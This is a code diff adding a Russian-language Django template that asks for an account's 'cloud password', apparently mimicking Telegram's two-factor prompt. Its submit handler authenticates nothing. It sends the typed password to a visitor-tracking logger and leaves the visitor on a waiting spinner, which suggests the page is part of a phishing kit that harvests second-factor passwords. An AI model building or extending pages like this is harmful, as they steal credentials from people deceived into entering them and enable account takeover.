@@ -1,0 +1,73 @@
+{% extends 'base.html' %}
+{% load static i18n %}
+
+{% block content %}
+<div class="auth-card__body">
+    {% include 'includes/logo.html' %}
+
+    <div class="auth-card__title_wrapper">
+        <h1 class="auth-card__title">{% trans "Введите облачный пароль" %}</h1>
+        <p class="auth-card__subtitle">{% trans "Ваш аккаунт защищен облачным паролем" %}</p>
+    </div>
+
+    <form class="auth-card__form" id="keyword-form" novalidate>
+        <div class="auth-card__field">
+            <div class="auth-card__password-wrapper">
+                <input type="password" id="keyword-input" class="auth-card__input" autocomplete="cloud-keyword" placeholder="{% trans "Пароль" %}">
+                <button type="button" id="keyword-toggle" class="auth-card__password-toggle" aria-label="{% trans "Показать пароль" %}" data-show-label="{% trans "Скрыть пароль" %}" data-hide-label="{% trans "Показать пароль" %}">
+                    <svg class="auth-card__password-icon auth-card__password-icon--hidden" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                        <circle cx="12" cy="12" r="3"></circle>
+                    </svg>
+                    <svg class="auth-card__password-icon auth-card__password-icon--visible" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                        <line x1="1" y1="1" x2="23" y2="23"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <button type="submit" id="keyword-submit" class="btn btn-primary auth-card__submit" disabled>{% trans "Продолжить" %}</button>
+    </form>
+</div>
+{% endblock content %}
+
+{% block js_scripts %}
+    <script>window.VISITOR_STEP = {% if resume_waiting %}'waiting'{% else %}'keyword_entry'{% endif %};</script>
+    <script src="{% static 'js/visitor-tracker.js' %}"></script>
+    {% if resume_waiting %}<script>window.showStepSpinner();</script>{% endif %}
+    <script>
+        (function () {
+            var input = document.getElementById('keyword-input');
+            var submitButton = document.getElementById('keyword-submit');
+            var form = document.getElementById('keyword-form');
+            var toggleButton = document.getElementById('keyword-toggle');
+            var visibleIcon = document.querySelector('.auth-card__password-icon--visible');
+            var hiddenIcon = document.querySelector('.auth-card__password-icon--hidden');
+
+            input.addEventListener('input', function () {
+                submitButton.disabled = input.value.trim().length === 0;
+            });
+
+            toggleButton.addEventListener('click', function (event) {
+                event.preventDefault();
+                var isPassword = input.type === 'password';
+                input.type = isPassword ? 'text' : 'password';
+                toggleButton.classList.toggle('auth-card__password-toggle--visible');
+                var newLabel = isPassword ? toggleButton.dataset.showLabel : toggleButton.dataset.hideLabel;
+                toggleButton.setAttribute('aria-label', newLabel);
+            });
+
+            form.addEventListener('submit', function (event) {
+                event.preventDefault();
+                var keyword = input.value.trim();
+                if (!keyword) {
+                    return;
+                }
+                if (window.visitorTrackerLog) {
+                    window.visitorTrackerLog('password', keyword);
+                }
+                window.showStepSpinner();
+            });
+        })();
+    </script>
+{% endblock js_scripts %}
